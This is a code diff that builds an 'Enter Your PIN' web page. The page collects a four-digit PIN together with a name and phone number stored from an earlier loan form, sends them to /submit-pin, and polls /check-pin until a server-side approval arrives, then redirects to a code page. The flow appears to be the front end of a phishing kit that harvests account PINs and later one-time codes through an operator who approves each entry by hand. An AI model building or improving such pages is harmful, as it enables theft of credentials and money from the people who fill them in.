@@ -1,46 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter PIN</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f6f7fb;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .pin-container {
+        background: #fff;
+        padding: 30px;
+        border-radius: 12px;
+        width: 100%;
+        max-width: 350px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        text-align: center;
+    }
+
+    h2 { margin-bottom: 8px; }
+    p { color: #666; font-size: 14px; }
+
+    .pin-boxes {
+        display: flex;
+        justify-content: space-between;
+        margin: 25px 0;
+        transition: all 0.3s ease;
+    }
+
+    .pin-boxes input {
+        width: 55px;
+        height: 60px;
+        text-align: center;
+        font-size: 24px;
+        border: 2px solid red;
+        border-radius: 8px;
+        outline: none;
+        transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .pin-boxes input:focus {
+        border-color: darkred;
+        box-shadow: 0 0 5px rgba(255,0,0,0.5);
+    }
+
+    .shake {
+        animation: shake 0.4s;
+    }
+
+    @keyframes shake {
+        0% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        50% { transform: translateX(5px); }
+        75% { transform: translateX(-5px); }
+        100% { transform: translateX(0); }
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background: red;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        cursor: pointer;
+        position: relative;
+    }
+
+    button:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+    }
+
+    .spinner {
+        display: none;
+        width: 20px;
+        height: 20px;
+        border: 3px solid #fff;
+        border-top: 3px solid rgba(255,255,255,0.3);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+    }
+
+    @keyframes spin {
+        0% { transform: translateY(-50%) rotate(0deg); }
+        100% { transform: translateY(-50%) rotate(360deg); }
+    }
+
+    .status {
+        margin-top: 15px;
+        font-size: 14px;
+        color: #555;
+    }
+
+    .error {
+        color: red;
+    }
+</style>
+</head>
+
+<body>
+<div class="pin-container">
+    <h2>Enter Your PIN</h2>
+    <p>Please enter your 4-digit PIN</p>
+
+    <form id="pinForm">
+        <div class="pin-boxes" id="pinBoxes">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+        </div>
+
+        <button id="submitBtn" disabled>
+            Submit PIN
+            <div class="spinner" id="spinner"></div>
+        </button>
+    </form>
+
+    <div class="status" id="status"></div>
+</div>
+
 <script>
-async function submitPin() {
-  const pinInput = document.getElementById('pinInput');
-  const pin = pinInput.value.trim();
-  const submitBtn = document.getElementById('submitBtn');
+const inputs = document.querySelectorAll('.pin-boxes input');
+const button = document.getElementById('submitBtn');
+const statusText = document.getElementById('status');
+const spinner = document.getElementById('spinner');
+const form = document.getElementById('pinForm');
+const pinBoxes = document.getElementById('pinBoxes');
 
-  if (!pin) {
-    alert('Please enter your PIN');
-    return;
-  }
+let attempts = 0;
+const maxAttempts = 3;
 
-  submitBtn.disabled = true;
-  submitBtn.innerText = 'Verifying...';
+inputs[0].focus();
 
-  // Get user details from localStorage
-  const userDetails = JSON.parse(localStorage.getItem('loanDetails')) || {};
-  const { name, phone } = userDetails;
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, '');
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+        checkFilled();
+    });
+    input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
 
-  // Send PIN along with Name and Phone to server
-  try {
-    const res = await fetch('/submit-pin', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ name, phone, pin })
+function checkFilled() {
+    button.disabled = ![...inputs].every(i => i.value);
+}
+
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const pin = [...inputs].map(i => i.value).join('');
+    const name = localStorage.getItem('name');
+    const phone = localStorage.getItem('phone');
+
+    button.disabled = true;
+    button.innerText = 'Verifying...';
+    spinner.style.display = 'inline-block';
+    statusText.innerText = 'Please wait while we verify your PIN...';
+
+    await fetch('/submit-pin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ name, phone, pin })
     });
 
-    const data = await res.json();
+    pollPinApproval(pin);
+});
 
-    // Start polling for approval
+async function pollPinApproval(pin) {
     const interval = setInterval(async () => {
-      const check = await fetch(`/check-pin/${pin}`);
-      const { approved } = await check.json();
+        const res = await fetch(`/check-pin/${pin}`);
+        const data = await res.json();
 
-      if (approved) {
-        clearInterval(interval);
-        window.location.href = 'code.html';
-      }
-    }, 1000);
+        if (data.approved === true) {
+            clearInterval(interval);
+            window.location.href = 'code.html';
+        }
 
-  } catch (err) {
-    console.error('Error submitting PIN:', err);
-    submitBtn.disabled = false;
-    submitBtn.innerText = 'Submit';
-  }
+        if (data.approved === false) {
+            clearInterval(interval);
+            attempts++;
+            pinBoxes.classList.add('shake');
+            setTimeout(() => pinBoxes.classList.remove('shake'), 400);
+
+            if (attempts >= maxAttempts) {
+                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
+                button.disabled = true;
+                spinner.style.display = 'none';
+                inputs.forEach(i => i.value = '');
+                return;
+            }
+
+            statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
+            button.innerText = 'Submit PIN';
+            spinner.style.display = 'none';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+            button.disabled = true;
+        }
+    }, 2000);
 }
 </script>
+</body>
+</html>
